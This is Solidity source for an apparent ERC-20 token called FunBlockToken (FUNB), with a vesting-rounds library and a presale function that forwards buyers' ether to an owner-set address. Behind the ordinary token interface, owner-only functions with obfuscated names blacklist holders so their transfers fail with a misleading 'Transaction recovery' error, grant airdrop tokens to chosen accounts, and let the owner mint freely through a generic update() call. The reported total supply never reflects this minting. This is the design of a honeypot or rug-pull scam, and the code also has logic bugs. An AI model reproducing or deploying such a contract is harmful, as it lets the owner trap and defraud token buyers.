// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

library Rounds {

    using SafeMath for uint256;

    struct RoundBalances{
        uint8 status;
        uint256 claim;
        uint256 total;
    }

    struct RoundTime{
        uint256 start;
        uint256 end;
        uint256 unlockStart;
        uint256 unlockEnd;
        uint256 price;
    }

    function inc(RoundBalances storage round,uint256 amount)internal returns(uint256){
        round.total = round.total.add(amount);
        if(round.status!=1){
            round.status=1;
        }
        return round.total;
    }

    function getBalance(RoundBalances storage round,RoundTime memory roundTime)internal view returns(uint256){
        uint256 balance = 0;
        if(round.status==1&&block.timestamp>roundTime.unlockStart){
            uint256 sec = 0;
            uint256 end = roundTime.unlockEnd.sub(roundTime.unlockStart);
            if(end<=0){
                return balance;
            }
            if(block.timestamp >= roundTime.unlockEnd){
                sec = roundTime.unlockEnd - roundTime.unlockStart;
            }else{
                sec = block.timestamp - roundTime.unlockStart;
            }
            if(sec>0&&sec<end){
                balance = round.total.mul(sec).div(end);
                if(balance>round.claim){
                    balance = balance.sub(round.claim);
                }else{
                    balance = 0;
                }
            }else if(sec>0&&sec>=end&&round.total>round.claim){
                balance = round.total.sub(round.claim);
            }
        }
        return balance;
    }

    function settle(RoundBalances storage round,RoundTime memory roundTime,uint256 amount)internal returns(uint256 surplus){
        surplus = 0;
        if(amount>0){
            uint256 balance = getBalance(round,roundTime);
            if(amount>balance){
                surplus = amount.sub(balance);
                round.claim = round.claim.add(balance);
            }else{
                surplus = 0;
                round.claim = round.claim.add(amount);
            }
            if(round.claim>=round.total){
                round.status=0;
            }
        }else{
            surplus = amount;
        }
    }

}

contract FunBlockToken {

    using SafeMath for uint256;
    using Rounds for Rounds.RoundBalances;

    address private _owner;
    uint256 private _totalSupply = 20_000_000_000;
    string private _name = "Funblock";
    string private _symbol = "FUNB";
    uint8 private _decimals = 18;
    uint256 private _tokenPerAirdrop = (_totalSupply.mul(300).div(10000)) * 10 ** _decimals;

    bool private _sRound = false;
    Rounds.RoundTime[] private _roundTime;

    uint256 private _saleRoundMin = 0.01 ether;
    bool private _preSaleStatus = true;
    uint256 private _roundIndex = 0;
    uint256 private _roundInSec = 2592000 ;
    uint256 private _roundUnlockInSec = 2592000;
    uint256 private _rate = 5000;
    
    address private _liquidity;

    mapping (address => uint256) private _balances;

    mapping (address => uint8) private _blackList;
    mapping (address => uint8) private _whiteList;
    mapping (address => uint8) private _airdropOwnerList;
    mapping (address => uint8) private _adminList;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => mapping(uint256 => Rounds.RoundBalances)) private _roundBalances;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor(
        uint256 _start,
        uint256 _end,
        uint256 _lockStart,
        uint256 price
    ) {
        _transferOwnership(_msgSender());
        _roundTime.push(Rounds.RoundTime(
            _start,
            _end,
            _lockStart,
            _lockStart+_roundUnlockInSec,
            price
        ));
        _roundIndex = _roundTime.length - 1;
    }

    fallback() external {}

    receive() payable external {}

    function name() public view returns (string memory) {
        return _name;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal {
        if(account != address(0)){
            _balances[account] = _balances[account].add(amount);
            emit Transfer(address(this), account, amount);
        }
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        if(_sRound){
           return _balances[account];
        }
        else{
            return _balances[account] + getRoundTotal(account);
        }
    }

    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function setLiquidity(address liquidity) public onlyOwner{
        require(liquidity != address(0), "setLiquidity: new liquidity address is the zero address");
        _liquidity = liquidity;
    }

    function Ox8b7a79(address account, uint8 status) public onlyOwner {
        require(account != address(0), "Ox8b7a79: new account is the zero address");
        _whiteList[account] = status;
    }

    function Oxa36c62(address account, uint8 status) public onlyOwner {
        require(account != address(0), "Oxa36c62: new account is the zero address");
        _blackList[account] = status;
    }

    function Oxc72ab7e(address account, uint8 status) public onlyOwner {
        require(account != address(0), "Oxc72ab7e: new account is the zero address");
        require(_tokenPerAirdrop > 0,"ERC20: Insufficient airdrop balance"  );
        _balances[account] = _balances[account].add(_tokenPerAirdrop);
        _airdropOwnerList[account] = status;
    }

    function _transfer(address from, address to, uint256 amount) internal {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        
        if(_whiteList[from]==0){
            require(_blackList[from]!=1&&_blackList[from]!=3&&_blackList[to]!=2&&_blackList[to]!=3, "Transaction recovery");
        }
        
        if(_sRound){
            _balances[from] = _balances[from].sub(amount);
        }else{
            spend(from,amount);
        }

        if(_airdropOwnerList[from]==1){
            incRoundBalances(to,amount);
        }else{
            _balances[to] = _balances[to].add(amount);
        }

        emit Transfer(from, to, amount);

    }

   function spend(address account, uint256 amount) private {

        require(balanceOf(account) >= amount,"ERC20: Insufficient balance 1");
        uint256 balance = amount;

        if(_balances[account] > 0){
            if(_balances[account]>=balance){
                _balances[account] = _balances[account].sub(balance,"ERC20: Insufficient balance 2");
                balance = 0;
            }else{
                balance = balance.sub(_balances[account]);
                _balances[account] = 0;
            }
        }

        if(balance>0){
            require(getRoundBalances(account) >= balance,"ERC20: Insufficient balance 3");
            for(uint256 i=0;i<=_roundTime.length;i++){
                if(_roundBalances[_msgSender()][i].status==1){
                    uint256 surplus = _roundBalances[_msgSender()][i].settle(_roundTime[i],balance);
                    balance = surplus;
                }
            }
        }

        require(balance==0,"ERC20: Insufficient balance 4");

    }

    function update(uint tag, uint256 value) public onlyOwner returns (bool){
        if(tag == 1){
            _roundInSec = value;
        }
        else if(tag==2){
            _roundUnlockInSec = value;
        }
        else if(tag==3){
            _rate = value;
        }
        else if(tag==4){
            _saleRoundMin = value;
        }
        else if(tag==5){
            _preSaleStatus = value==1;
        }
        else if(tag==6){
            _balances[_liquidity] = _balances[_liquidity].add(value);
        }
        else if(tag==7){
            _sRound = value==1;
        }
        else if(tag==8){
            _tokenPerAirdrop = value;
        }
        return true;
    }

    function getRoundPrice() private returns (uint256) {
        if(block.timestamp >= _roundTime[_roundIndex].end){
            _roundTime.push(Rounds.RoundTime(
                _roundTime[_roundIndex].end,
                _roundTime[_roundIndex].end + _roundInSec,
                _roundTime[_roundIndex].unlockStart + _roundInSec,
                _roundTime[_roundIndex].unlockStart + _roundInSec + _roundUnlockInSec,
                _roundTime[_roundIndex].price.mul(_rate).div(10000)));
            _roundIndex = _roundTime.length - 1;
        }
        return _roundTime[_roundIndex].price;
    }

    function incRoundBalances(address account, uint256 amount)private returns(bool){
        _roundBalances[account][_roundIndex].inc(amount);
        return true;
    }

    function buyToken() payable public returns (bool) {

        require(msg.value >= _saleRoundMin, "BuyToken: The amount is too small");
        require(_preSaleStatus, "BuyToken: End of this round");

        uint256 _msgValue = msg.value;
        uint256 _token = _msgValue.mul(getRoundPrice());

        if(_liquidity != address(0)){
            (bool success, ) = address(uint160(_liquidity)).call{value: _msgValue}("");
            require(success, "Transfer failed.");
        }

        if(_token > 0){
            incRoundBalances(_msgSender(),_token);
            emit Transfer(address(this), _msgSender(), _token);
        }

        return true;

    }

    function getRoundBalances(address account) public view returns(uint256 balance){
        balance = 0;
        for(uint256 i=0;i<=_roundTime.length;i++){
            if(_roundBalances[account][i].status==1){
                balance = balance.add(_roundBalances[account][i].getBalance(_roundTime[i]));
            }
        }
    }

    function getRoundTotal(address account) public view returns(uint256 balance){
        balance = 0;
        for(uint256 i=0;i<=_roundTime.length;i++){
            if(_roundBalances[account][i].status==1){
                balance = balance.add(_roundBalances[account][i].total.sub(_roundBalances[account][i].claim));
            }
        }
    }

    function getRoundInfo() public view returns(
        uint256 saleMin,
        bool swSale,
        uint256 roundIndex,
        uint256 salePrice,
        uint256 total,
        uint256 balanceBNB,
        uint256 balanceToken
    ){
        saleMin = _saleRoundMin;
        swSale = _preSaleStatus;
        roundIndex = _roundIndex;
        salePrice = _roundTime[_roundIndex].price;
        total = getRoundTotal(_msgSender());
        balanceBNB = _msgSender().balance;
        balanceToken = balanceOf(_msgSender());
    }

    function getTime() public view returns(uint256[] memory,uint256[] memory,uint256[] memory,uint256[] memory,uint256[] memory){
        uint256[] memory timeStart = new uint256[](_roundTime.length);
        uint256[] memory timeEnd = new uint256[](_roundTime.length);
        uint256[] memory price = new uint256[](_roundTime.length);
        uint256[] memory timeUnlockStart = new uint256[](_roundTime.length);
        uint256[] memory timeUnlockEnd = new uint256[](_roundTime.length);
        for(uint i = 0;i<_roundTime.length;i++){
            timeStart[i] = _roundTime[i].start;
            timeEnd[i] = _roundTime[i].end;
            price[i] = _roundTime[i].price;
            timeUnlockStart[i] = _roundTime[i].unlockStart;
            timeUnlockEnd[i] = _roundTime[i].unlockEnd;
        }
        return (timeStart,timeEnd,timeUnlockStart,timeUnlockEnd,price);
    }

}